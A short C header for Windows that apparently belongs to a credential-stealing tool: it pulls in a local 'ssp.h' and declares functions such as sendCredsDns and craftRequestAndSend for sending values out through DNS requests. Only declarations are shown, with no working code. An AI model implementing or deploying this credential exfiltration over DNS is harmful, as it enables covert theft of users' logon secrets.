#ifndef _DNS_H
#define _DNS_H

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <windns.h>
#include "utils.h"
#include "ssp.h"

#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "ws2_32.lib")

BOOL dnsRequest(char*);
BOOL craftRequestAndSend(char* value, char* index, char* key, size_t keysize);
void sendCredsDns(WCHAR*, WCHAR*, WCHAR*);

#endif